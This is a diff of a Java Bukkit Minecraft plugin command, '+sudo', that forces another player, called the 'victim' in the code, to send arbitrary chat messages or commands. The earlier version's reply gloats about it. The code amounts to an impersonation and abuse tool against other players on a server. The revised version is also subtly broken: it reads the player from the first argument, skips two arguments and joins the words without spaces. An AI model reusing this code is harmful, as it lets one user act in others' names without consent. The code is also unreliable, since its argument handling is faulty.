@@ -1,12 +1,14 @@
 package de.Garkolym.Commands.Server;
 
+import java.util.ArrayList;
+
 import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 
 import de.Garkolym.Start;
 import de.Garkolym.Commands.Command;
 import de.Garkolym.Commands.CommandCategory;
+import net.md_5.bungee.api.ChatColor;
 
 public class CommandSUDO extends Command {
 
@@ -16,25 +18,22 @@ public class CommandSUDO extends Command {
 
 	@Override
 	public void onCommand(Player p, ArrayList<String> args) {
-		if(args.length > 2) {
+		if (args.size() > 1) {
 			try {
-				Player p1 = Bukkit.getPlayer(args[1]);
-				String Command = "";
-				char char1 = '"';
-				for(int i = 2;i < args.length;i++){
-					Command = Command + args[i] + " ";
+				String msg = "";
+				Player victim = Bukkit.getPlayer(args.get(0));
+				for (int i = 3; i < args.size(); i++) {
+					msg += args.get(i);
 				}
-				p1.chat(Command);
-				p.sendMessage(Start.instance.prefix + ChatColor.GREEN + "Der Command " + char1 + Command + char1 + " wurde versand >:)!");
-			}catch(Exception e) {
+				victim.chat(msg);
+				p.sendMessage(ChatColor.GREEN + "Dieser Spieler hat nun die Nachricht abgesendet!");
+			} catch (Exception e) {
 				p.sendMessage(Start.instance.prefix + ChatColor.RED + "Dieser Spieler ist nicht online!");
 			}
 		}
-		if(args.length < 2) {
-			p.sendMessage(Start.instance.prefix + ChatColor.RED + "Nutze +sudo <Spieler> <Command/Nachricht>");
-		}
-		if(args.length == 2) {
-			p.sendMessage(Start.instance.prefix + ChatColor.RED + "Nutze +sudo <Spieler> <Command/Nachricht>");
+		else
+		{
+			p.sendMessage(Start.instance.prefix + ChatColor.RED + "Die Syntax ist falsch!");
 		}
 	}
 }
